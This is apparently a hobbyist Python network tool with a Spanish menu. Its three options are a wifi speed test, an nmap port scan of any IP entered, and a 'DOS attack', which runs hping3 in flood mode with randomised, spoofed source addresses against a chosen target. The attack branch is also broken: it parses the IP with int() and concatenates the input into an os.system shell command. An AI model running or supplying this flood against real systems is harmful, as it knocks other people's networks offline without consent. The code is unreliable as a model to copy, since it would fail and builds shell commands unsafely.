import os
import time
import speedtest
import nmap

print(""" 
'|| '||'  '|' '||' '||''''| '||'     ..|'''.|  '||''''|  '||'  |'   ..|''||   
 '|. '|.  .'   ||   ||  .    ||     .|'     '   ||  .     || .'    .|'    ||  
  ||  ||  |    ||   ||''|    ||     ||    ....  ||''|     ||'|.    ||      || 
   ||| |||     ||   ||       ||     '|.    ||   ||        ||  ||   '|.     || 
    |   |     .||. .||.     .||.     ''|...'|  .||.....| .||.  ||.  ''|...|' 
       """)


menu = int(input("Selecione una opcion: \n 1- Ver rendimiento del wifi \n 2- Escanear puertos \n 3- Ataque DOS al wifi \n -> "))

if menu == 1:
       
       print("Vamos a ver el rendimiento del wifi esto puede tardar un rato")
       def test_speed():
             st = speedtest.Speedtest()
             download_speed = st.download() / 10**6
             upload_speed = st.upload() / 10**6 
             ping = st.results.ping
             return download_speed, upload_speed, ping
       if __name__ == "__main__":
             download_speed, upload_speed, ping = test_speed()
             print(f"Velocidad de descarga: {download_speed:.2f} Mbps")
             print(f"Velocidad de carga: {upload_speed:.2f} Mbps")
             print(f"Ping: {ping} ms")

elif menu == 2:
    ip = input("[+] IP Objetivo -> ")
    nm = nmap.PortScanner()
    puertos_abiertos = "-p "
    results = nm.scan(hosts=ip, arguments="-sT -n -Pn -T4")
    count = 0

    print("\nHost : %s" % ip)
    print("State : %s" % nm[ip].state())
    for proto in nm[ip].all_protocols():
        print("Protocol : %s" % proto)
        print()
        lport = nm[ip][proto].keys()
        sorted(lport)
        for port in lport:
            print("port : %s\tstate : %s" % (port, nm[ip][proto][port]["state"]))
            if count == 0:
                puertos_abiertos = puertos_abiertos + str(port)
                count = 1
            else:
                puertos_abiertos = puertos_abiertos + "," + str(port)
    print("\nPuertos abiertos: " + puertos_abiertos + " " + str(ip))

elif menu == 3:
    id = int(input("Indique la IP la cual atacar: "))
    os.system("hping3 --rand-source --flood " + id)
